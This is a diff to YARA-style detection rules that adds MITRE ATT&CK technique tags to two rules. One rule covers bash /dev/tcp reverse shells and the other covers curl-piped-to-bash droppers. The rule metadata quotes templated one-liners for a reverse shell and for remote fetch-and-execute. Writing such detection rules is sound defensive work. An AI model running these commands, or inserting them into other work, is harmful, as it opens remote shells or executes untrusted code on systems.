@@ -10,6 +10,7 @@ rule Shell_Reverse_TCP_Bash
         description = "Interactive shell wired to a TCP socket via bash /dev/tcp (reverse shell)"
         family      = "shell.reverse"
         severity    = "critical"
+        attack      = "T1059.004"
         reference   = "bash -i >& /dev/tcp/<ip>/<port> 0>&1"
         date        = "2026-06"
     strings:
@@ -29,6 +30,7 @@ rule Shell_Pipe_To_Shell_From_IP
         description = "Remote script piped straight into a shell, fetched from a raw IP over http"
         family      = "shell.dropper"
         severity    = "high"
+        attack      = "T1105, T1059.004"
         reference   = "curl http://<ip>/x | bash"
         date        = "2026-06"
     strings:
